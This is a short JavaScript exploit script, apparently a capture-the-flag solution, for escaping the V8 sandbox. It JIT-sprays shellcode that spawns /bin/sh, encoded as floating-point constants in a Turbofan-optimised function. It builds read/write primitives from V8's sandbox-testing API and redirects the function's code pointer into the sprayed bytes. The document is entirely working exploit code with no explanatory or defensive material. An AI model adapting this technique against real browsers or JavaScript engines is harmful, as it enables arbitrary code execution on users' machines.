/* constants */

const kTurbofanInvocationCount = 100000; // invocation count for triggering turbofan compilation

const kIntSize = 4; // size of int

const kCodeOffset = 0x18; // offset of code in JSFunction
const kShellcodeOffset = 0x75; // offset of shellcode from instruction start

/* --------- */


/* helpers */

// compile function with turbofan
function compileTurbofan(f, args = []) { for (let i = 0; i < kTurbofanInvocationCount; i++) { f(...args); } }

// convert integer to hex form
function hex(i) { return `0x${i.toString(16)}`; }

/* ------- */


/* jit spraying */

function shellcode() {
    return [
        1.1, // dummy for passing IsOffHeapTrampoline test

        // shellcode.py
        1.971182900732201e-246, // 0xceb909090ff3148
        1.9710255989868064e-246, // 0xceb900068732fbf
        1.9711824229537597e-246, // 0xceb909020e7c148
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711456320011235e-246, // 0xceb906e69622fbe
        1.9711826576393808e-246, // 0xceb909057f70148
        1.9995716425629537e-246, // 0xcebf63148e78948
        1.9844872660306937e-246, // 0xcebc03148d23148
        -6.828844406037547e-229, // 0x909090c3050f3bb0
    ];
}

console.log("[+] JIT spraying...");
compileTurbofan(shellcode);

/* ------------ */


/* implement exploit primitives */

// get compressed address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// if value isn't provided, read int from addr
// if value is provided, write int value to addr
function rw(addr, value = NaN) {
    let view = new DataView(new Sandbox.MemoryView(addr, kIntSize));

    if (isNaN(value)) { // read
        return view.getUint32(0, true);
    } else { // write
        view.setUint32(0, value, true);
    }
}

/* ---------------------------- */


/* escape v8 sandbox */

let jit_addr = addrof(shellcode);
console.log(`[+] jit_addr == ${hex(jit_addr)}`);

let code_addr = rw(jit_addr + kCodeOffset);
console.log(`[+] code_addr == ${hex(code_addr)}`);

rw(jit_addr + kCodeOffset, code_addr + kShellcodeOffset);
shellcode(); // execute shellcode

/* ----------------- */
